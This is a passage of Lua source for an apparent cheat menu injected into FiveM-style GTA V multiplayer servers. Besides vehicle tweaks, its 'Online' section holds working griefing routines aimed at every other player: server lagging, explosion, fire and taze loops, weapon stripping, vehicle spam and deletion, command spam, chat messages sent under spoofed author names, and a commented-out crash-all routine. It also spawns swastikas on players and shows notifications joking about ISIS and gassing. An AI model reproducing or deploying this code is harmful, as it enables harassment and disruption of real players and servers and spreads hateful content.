                if not self:GetFunction("DoesEntityExist")(veh) then return self:AddNotification("ERROR", "You must be in a vehicle to use this!") end
   
                self:RepairVehicle(veh)
   
                self:AddNotification("SUCCESS", "Vehicle repaired!", 10000)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("FLIP VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "flip_vehicle") then
   
                local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)
   
                if not self:GetFunction("DoesEntityExist")(veh) then return self:AddNotification("ERROR", "You must be in a vehicle to use this!") end
   
                self:GetFunction("SetVehicleOnGroundProperly")(veh)
   
                self:AddNotification("SUCCESS", "Vehicle flipped!", 10000)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("MAX VEHICLE OUT", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "max_out_vehicle") then
   
                local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)
   
                self:GetFunction("SetVehicleModKit")(veh, 0)
   
                self:GetFunction("SetVehicleMod")(veh, 11, self:GetFunction("GetNumVehicleMods")(veh, 11) - 1, false)
   
                self:GetFunction("SetVehicleMod")(veh, 12, self:GetFunction("GetNumVehicleMods")(veh, 12) - 1, false)
   
                self:GetFunction("SetVehicleMod")(veh, 13, self:GetFunction("GetNumVehicleMods")(veh, 13) - 1, false)
   
                self:GetFunction("SetVehicleMod")(veh, 15, self:GetFunction("GetNumVehicleMods")(veh, 15) - 2, false)
   
                self:GetFunction("SetVehicleMod")(veh, 16, self:GetFunction("GetNumVehicleMods")(veh, 16) - 1, false)
   
                self:GetFunction("ToggleVehicleMod")(veh, 17, true)
   
                self:GetFunction("ToggleVehicleMod")(veh, 18, true)
   
                self:GetFunction("ToggleVehicleMod")(veh, 19, true)
   
                self:GetFunction("ToggleVehicleMod")(veh, 21, true)
   
                self:AddNotification("SUCCESS", "Vehicle maxed out.", 10000)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("VEHICLE ENGINE BOOST: ", boost_options, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_boost", self:IndexOf(boost_options, dict.tostring(self.Config.Vehicle.Boost + 0.0))) then
   
                self.Config.Vehicle.Boost = dict.tonumber(boost_options[list_choices["vehicle_boost"].selected])
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("UNLOCK CLOSEST VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "unlock_closest_vehicle") then
   
                local closestVeh = self:GetClosestVehicle()
   
                if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end
   
                self:AddNotification("INFO", "Unlocking vehicle.", 5000)
   
                self:UnlockVehicle(closestVeh)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("LOCK CLOSEST VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "lock_closest_vehicle") then
   
                local closestVeh = self:GetClosestVehicle()
   
                if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end
   
                self:AddNotification("INFO", "Locking vehicle.", 5000)
   
                self:UnlockVehicle(closestVeh, true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("DISABLE CLOSEST VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disable_closest_vehicle") then
   
                local closestVeh = self:GetClosestVehicle()
   
                if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end
   
                self:DisableVehicle(closestVeh)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("DELETE CLOSEST VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_closest_vehicle") then
   
                local closestVeh = self:GetClosestVehicle()
   
                if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end
   
                self.Util:DeleteEntity(closestVeh)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("TP INTO CLOSEST VEHICLE (SHIFT FOR DRIVER SEAT)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "tp_into_closest_vehicle") then
   
                local closestVeh = self:GetClosestVehicle()
   
                if not self:GetFunction("DoesEntityExist")(closestVeh) then return self:AddNotification("ERROR", "No vehicle!") end
   
                local seat = 0
   
    
   
                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                    self:KickOutAllPassengers(closestVeh, -1)
   
                    seat = -1
   
                end
   
    
   
                self:GetFunction("TaskWarpPedIntoVehicle")(self.LocalPlayer, closestVeh, seat)
   
                self:AddNotification("SUCCESS", "Teleported into vehicle!", 5000)
   
            end
   
        end)
   
    
   
        local spamming_command
   
    
   
        AREF:AddCategory("Online", function(self, x, y, w, h)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("INCLUDE SELF", self.Config.OnlineIncludeSelf, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "online_include_self") then
   
                self.Config.OnlineIncludeSelf = not self.Config.OnlineIncludeSelf
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("LAG SERVER", _use_lag_server, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "lag_server_out") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_lag_server = not _use_lag_server
   
                    self:LaggingServer()
   
    
   
                    if _use_lag_server then
   
                        self:AddNotification("INFO", "Lagging server!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped lagger.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("HYDRANT LOOP", _use_hydrant_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_loop_all") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_hydrant_loop = not _use_hydrant_loop
   
                    self:HydrantLoop()
   
    
   
                    if _use_hydrant_loop then
   
                        self:AddNotification("INFO", "Water for all!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped water.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("FIRE LOOP", _use_fire_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fire_loop_all") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_fire_loop = not _use_fire_loop
   
                    self:FireLoop()
   
    
   
                    if _use_fire_loop then
   
                        self:AddNotification("INFO", "Fire for all!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped fire.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("TAZE LOOP", _use_taze_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "taze_loop_all") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_taze_loop = not _use_taze_loop
   
                    self:TazeLoop()
   
    
   
                    if _use_taze_loop then
   
                        self:AddNotification("INFO", "Tazing for all!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped tazing.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("DELETE VEHICLES LOOP", _use_delete_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_all_vehicles_loop") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_delete_loop = not _use_delete_loop
   
                    self:DeleteLoop()
   
    
   
                    if _use_delete_loop then
   
                        self:AddNotification("INFO", "No more cars!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped deleting.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("EXPLODE VEHICLES LOOP", _use_explode_vehicle_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_vehicles_loop") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_explode_vehicle_loop = not _use_explode_vehicle_loop
   
                    self:ExplodeVehicleLoop()
   
    
   
                    if _use_explode_vehicle_loop then
   
                        self:AddNotification("INFO", "Crisp cars for all!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped exploding.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("EXPLODE PLAYERS LOOP", _use_explode_player_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player_loop") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_explode_player_loop = not _use_explode_player_loop
   
                    self:ExplodePlayerLoop()
   
    
   
                    if _use_explode_player_loop then
   
                        self:AddNotification("INFO", "ISIS for all!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped exploding.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("LAUNCH VEHICLE LOOP", _use_launch_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "_use_launch_loop") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _use_launch_loop = not _use_launch_loop
   
                    self:LaunchLoop()
   
    
   
                    if _use_launch_loop then
   
                        self:AddNotification("INFO", "Time to go to space!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped launching.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("DISABLE VEHICLE LOOP", _disable_vehicle_loop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "_disable_vehicle_loop") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    _disable_vehicle_loop = not _disable_vehicle_loop
   
                    self:DisableLoop()
   
    
   
                    if _disable_vehicle_loop then
   
                        self:AddNotification("INFO", "No more driving!", 10000)
   
                    else
   
                        self:AddNotification("INFO", "Stopped disabling.", 10000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "remove_everyones_weapons") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        for id, src in dict.pairs(self.PlayerCache) do
   
                            src = dict.tonumber(src)
   
    
   
                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                for _, wep in dict.pairs(all_weapons) do
   
                                    self:GetFunction("RemoveWeaponFromPed")(ped, self:GetFunction("GetHashKey")(wep), 9000, false, true)
   
                                end
   
                            end
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "Weapons removed!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_everyone_weapons") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        for id, src, wep in dict.pairs(self.PlayerCache, all_weapons) do
   
                            src = dict.tonumber(src)
   
    
   
                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                for _, wep in dict.pairs(all_weapons) do
   
                                    self:GetFunction("GiveWeaponToPed")(ped, self:GetFunction("GetHashKey")(wep), 9000, false, true)
   
                                end
   
                            end
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "Weapons given!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("EXPLODE EVERYONE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explode_everyone") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                        for id, src in dict.pairs(self.PlayerCache) do
   
                            src = dict.tonumber(src)
   
    
   
                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                            end
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "ISIS Has entered the building!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("TURN ALL CARS INTO RAMPS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "ramp_all_cars") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    CreateThread(function()
   
                        self:RequestModelSync("stt_prop_stunt_track_dwslope30")
   
    
   
                        for vehicle in self:EnumerateVehicles() do
   
                            if vehicle ~= _veh or self.Config.OnlineIncludeSelf then
   
                                local ramp = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")("stt_prop_stunt_track_dwslope30"), 0, 0, 0, true, true, true)
   
                                self:DoNetwork(ramp)
   
                                self:GetFunction("NetworkRequestControlOfEntity")(vehicle)
   
                                self:RequestControlOnce(vehicle)
   
                                self:RequestControlOnce(ramp)
   
    
   
                                if self:GetFunction("DoesEntityExist")(vehicle) then
   
                                    self:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
   
                                end
   
                            end
   
    
   
                            Wait(50)
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "Turned all cars into ramps!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("TURN ALL CARS INTO FIB BUILDING", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fib_all_cars") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    CreateThread(function()
   
                        for vehicle in self:EnumerateVehicles() do
   
                            if vehicle ~= _veh or self.Config.OnlineIncludeSelf then
   
                                local building = self:GetFunction("CreateObject")(-1404869155, 0, 0, 0, true, true, true)
   
                                self:DoNetwork(ramp)
   
                                self:GetFunction("NetworkRequestControlOfEntity")(vehicle)
   
                                self:RequestControlOnce(vehicle)
   
                                self:RequestControlOnce(building)
   
    
   
                                if self:GetFunction("DoesEntityExist")(vehicle) then
   
                                    self:GetFunction("AttachEntityToEntity")(building, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
   
                                end
   
                            end
   
    
   
                            Wait(50)
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "Turned all cars into FIB Buildings!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("DELETE VEHICLES", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_all_vehicles") then
   
                self:AddNotification("INFO", "Deleting cars!", 10000)
   
                self:DeleteVehicles()
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("VEHICLE SPAM SERVER", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_spam_server") then
   
                self:CarSpamServer()
   
    
   
                if not self.Config.SafeMode then
   
                    self:AddNotification("INFO", "Unlimited vehicles!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("SWASTIKA ALL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "swastika_all") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        for id, src in dict.pairs(self.PlayerCache) do
   
                            src = dict.tonumber(src)
   
    
   
                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                if self:GetFunction("DoesEntityExist")(ped) then
   
                                    self.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](self:GetFunction("IsPedInAnyVehicle")(ped) and self:GetFunction("GetVehiclePedIsIn")(ped) or ped)
   
                                    Wait(1000)
   
                                end
   
                            end
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "Swastikas for all!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("GAS ALL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "gas_all") then
   
                if self.Config.SafeMode then
   
                    return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        for id, src in dict.pairs(self.PlayerCache) do
   
                            src = dict.tonumber(src)
   
    
   
                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                if self:GetFunction("DoesEntityExist")(ped) then
   
                                    self:GasPlayer(src)
   
                                    Wait(1000)
   
                                end
   
                            end
   
                        end
   
                    end)
   
    
   
                    self:AddNotification("INFO", "All players gassed!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
            -- if self.Painter:Button("~r~CRASH ALL (SHIFT FOR METHOD)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "crash_all") then
   
            -- 	if self.Config.SafeMode then
   
            -- 		return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
            -- 	else
   
            -- 		local method = nil
   
            -- 		if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
            -- 			local _method = self:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
   
            -- 			if _method then
   
            -- 				method = _method
   
            -- 				self:AddNotification("INFO", "Using " .. method .. " crash method.")
   
            -- 			end
   
            -- 		end
   
            -- 		CreateThread(function()
   
            -- 			for id, src in dict.pairs(self.PlayerCache) do
   
            -- 				src = dict.tonumber(src)
   
            -- 				if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
            -- 					local ped = self:GetFunction("GetPlayerPed")(src)
   
            -- 					if self:GetFunction("DoesEntityExist")(ped) then
   
            -- 						self:CrashPlayer(src, true, method)
   
            -- 						Wait(500)
   
            -- 					end
   
            -- 				end
   
            -- 			end
   
            -- 		end)
   
            -- 		self:AddNotification("INFO", "Crashing all players!", 10000)
   
            -- 	end
   
            -- end
   
            curY = 5
   
            local _w = (self.Painter:GetTextWidth("SPAWN PROP (SHIFT FOR ATTACH)", 4, 0.37)) + 2
   
    
   
            if self.Painter:Button("SPAWN PROP (SHIFT FOR ATTACH)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "spawn_prop_on_all") then
   
                self:DoSpawnObjectUI(nil, true)
   
            end
   
    
   
            curY = curY + 25
   
            local _w = (self.Painter:GetTextWidth("SPAM COMMAND (SHIFT FOR LOOP)", 4, 0.37)) + 2
   
    
   
            if self.Painter:Button("SPAM COMMAND (SHIFT FOR LOOP)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "spam_command") then
   
                spamming_command = false
   
    
   
                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                    local cmd = self:GetTextInput("Enter command.", "", 500)
   
    
   
                    if cmd then
   
                        local delay = self:GetTextInput("Enter delay in ms.", 100, 10)
   
    
   
                        if delay and dict.tonumber(delay) then
   
                            local wait = dict.tonumber(delay)
   
                            spamming_command = true
   
    
   
                            CreateThread(function()
   
                                while self.Enabled do
   
                                    if not spamming_command then break end
   
                                    self:GetFunction("ExecuteCommand")(cmd)
   
                                    Wait(wait)
   
                                end
   
                            end)
   
    
   
                            self:AddNotification("SUCCESS", "Spamming.", 10000)
   
                        else
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        end
   
                    else
   
                        self:AddNotification("INFO", "Cancelled.", 5000)
   
                    end
   
                else
   
                    local cmd = self:GetTextInput("Enter command.", "", 500)
   
    
   
                    if cmd then
   
                        local times = self:GetTextInput("Enter repetitions.", 1, 10)
   
    
   
                        if times and dict.tonumber(times) then
   
                            local repetitions = dict.tonumber(times)
   
                            local delay = self:GetTextInput("Enter delay in ms.", 100, 10)
   
    
   
                            if delay and dict.tonumber(delay) then
   
                                local wait = dict.tonumber(delay)
   
                                spamming_command = true
   
    
   
                                CreateThread(function()
   
                                    local repetition = 0
   
    
   
                                    while repetition < repetitions do
   
                                        repetition = repetition + 1
   
                                        self:GetFunction("ExecuteCommand")(cmd)
   
                                        Wait(wait)
   
                                    end
   
                                end)
   
    
   
                                self:AddNotification("SUCCESS", "Spamming.", 10000)
   
                            else
   
                                self:AddNotification("INFO", "Cancelled.", 5000)
   
                            end
   
                        else
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        end
   
                    else
   
                        self:AddNotification("INFO", "Cancelled.", 5000)
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then
   
                local _w = (self.Painter:GetTextWidth("CHAT MESSAGE (SHIFT FOR MULTIPLE)", 4, 0.37)) + 2
   
    
   
                if self.Painter:Button("CHAT MESSAGE (SHIFT FOR MULTIPLE)", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "send_message") then
   
                    local count = 1
   
                    local msg = self:GetTextInput("Enter message.", "", 500)
   
    
   
                    if msg then
   
                        local author = self:GetTextInput("Enter author.", "", 500)
   
    
   
                        if author then
   
                            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                                local times = self:GetTextInput("Enter repetitions.", count, 10)
   
    
   
                                if times and dict.tonumber(times) then
   
                                    count = times
   
                                end
   
                            end
   
    
   
                            for i = 1, count do
   
                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], author, {0, 0x99, 255}, msg)
   
                            end
   
                        else
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        end
   
                    else
   
                        self:AddNotification("INFO", "Cancelled.", 5000)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
        end)
   
    
   
        local was_godmode
   
        local was_boosted
   
        local was_dmg_boost
   
    
   
        function AREF:DoVehicleRelated()
   
            local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
            if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then return end
   
    
   
            if self.Config.Vehicle.BulletProofTires then
   
                self:GetFunction("SetVehicleTyresCanBurst")(curVeh, false)
   
                was_bulletproof = true
   
            elseif was_bulletproof then
   
                self:GetFunction("SetVehicleTyresCanBurst")(curVeh, true)
   
                was_bulletproof = false
   
            end
   
    
   
            if self.Config.Vehicle.GodMode then
   
                self:GetFunction("SetEntityInvincible")(curVeh, true)
   
    
   
                if self:GetFunction("IsVehicleDamaged")(curVeh) then
   
                    self:GetFunction("SetVehicleFixed")(curVeh)
   
                end
   
    
   
                was_godmode = true
   
            elseif was_godmode then
   
                self:GetFunction("SetEntityInvincible")(curVeh, false)
   
                was_godmode = false
   
            end
   
    
   
            if self.Config.Vehicle.Wallride then
   
                self:GetFunction("ApplyForceToEntity")(curVeh, 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)
   
            end
   
    
   
            if self.Config.Vehicle.Boost > 1.0 then
   
                self:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, self.Config.Vehicle.Boost + 1.0)
   
                was_boosted = true
   
            elseif was_boosted then
   
                self:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, 1.0)
   
                was_boosted = false
   
            end
   
    
   
            if self.Config.Weapon.DamageBoost > 1.0 then
   
                self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, self.Config.Weapon.DamageBoost)
   
                was_dmg_boost = true
   
            elseif was_dmg_boost then
   
                self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)
   
                was_dmg_boost = false
   
            end
   
        end
   
    
   
        function AREF:GetRainbow(freq)
   
            local cur = self:GetFunction("GetGameTimer")() / 1000
   
            local r = dict.math.floor(dict.math.sin(cur * freq + 0) * 127 + 128)
   
            local g = dict.math.floor(dict.math.sin(cur * freq + 2) * 127 + 128)
   
            local b = dict.math.floor(dict.math.sin(cur * freq + 4) * 127 + 128)
   
    
   
            return r, g, b
   
        end
   
    
   
        local rainbow_paint, rainbow_neon
   
    
   
        local LSC_Menu = {
   
            ["Paint"] = {
   
                {
   
                    Name = "Rainbow",
   
                    Get = function(veh) return rainbow_paint == veh and "~g~ON" or "~r~OFF" end,
   
                    Set = function(veh)
   
                        if rainbow_paint then
   
                            rainbow_paint = nil
   
    
   
                            return
   
                        else
   
                            rainbow_paint = veh
   
                        end
   
    
   
                        CreateThread(function()
   
                            while rainbow_paint and AREF.Enabled do
   
                                local r, g, b = AREF:GetRainbow(1)
   
                                AREF:GetFunction("SetVehicleCustomPrimaryColour")(rainbow_paint, r, g, b)
   
                                AREF:GetFunction("SetVehicleCustomSecondaryColour")(rainbow_paint, r, g, b)
   
                                Wait(0)
   
                            end
   
                        end)
   
                    end
   
                },
   
                {
   
                    Name = "Primary",
   
                    Get = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleCustomPrimaryColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        return dict.tostring(r) .. " " .. dict.tostring(g) .. " " .. dict.tostring(b)
   
                    end,
   
                    Set = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleCustomPrimaryColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        local r = AREF:GetTextInput("Enter red value.", r, 3)
   
    
   
                        if not r or r == "" or not tonumber(r) then
   
                            AREF:AddNotification("ERROR", "Invalid red value.", 5000)
   
                        else
   
                            local g = AREF:GetTextInput("Enter green value.", g, 3)
   
    
   
                            if not g or g == "" or not tonumber(g) then
   
                                AREF:AddNotification("ERROR", "Invalid green value.", 5000)
   
                            else
   
                                local b = AREF:GetTextInput("Enter blue value.", b, 3)
   
    
   
                                if not b or b == "" or not tonumber(b) then
   
                                    AREF:AddNotification("ERROR", "Invalid blue value.", 5000)
   
                                else
   
                                    r = AREF:Clamp(tonumber(r), 0, 255)
   
                                    g = AREF:Clamp(tonumber(g), 0, 255)
   
                                    b = AREF:Clamp(tonumber(b), 0, 255)
   
                                    AREF:GetFunction("SetVehicleCustomPrimaryColour")(veh, r, g, b)
   
                                end
   
                            end
   
                        end
   
                    end
   
                },
   
                {
   
                    Name = "Secondary",
   
                    Get = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleCustomPrimaryColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        return dict.tostring(r) .. " " .. dict.tostring(g) .. " " .. dict.tostring(b)
   
                    end,
   
                    Set = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleCustomPrimaryColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        local r = AREF:GetTextInput("Enter red value.", r, 3)
   
    
   
                        if not r or r == "" or not tonumber(r) then
   
                            AREF:AddNotification("ERROR", "Invalid red value.", 5000)
   
                        else
   
                            local g = AREF:GetTextInput("Enter green value.", g, 3)
   
    
   
                            if not g or g == "" or not tonumber(g) then
   
                                AREF:AddNotification("ERROR", "Invalid green value.", 5000)
   
                            else
   
                                local b = AREF:GetTextInput("Enter blue value.", b, 3)
   
    
   
                                if not b or b == "" or not tonumber(b) then
   
                                    AREF:AddNotification("ERROR", "Invalid blue value.", 5000)
   
                                else
   
                                    r = AREF:Clamp(tonumber(r), 0, 255)
   
                                    g = AREF:Clamp(tonumber(g), 0, 255)
   
                                    b = AREF:Clamp(tonumber(b), 0, 255)
   
                                    AREF:GetFunction("SetVehicleCustomSecondaryColour")(veh, r, g, b)
   
                                end
   
                            end
   
                        end
   
                    end
   
                }
   
            },
   
            ["Lights"] = {
   
                {
   
                    Name = "Rainbow Neon",
   
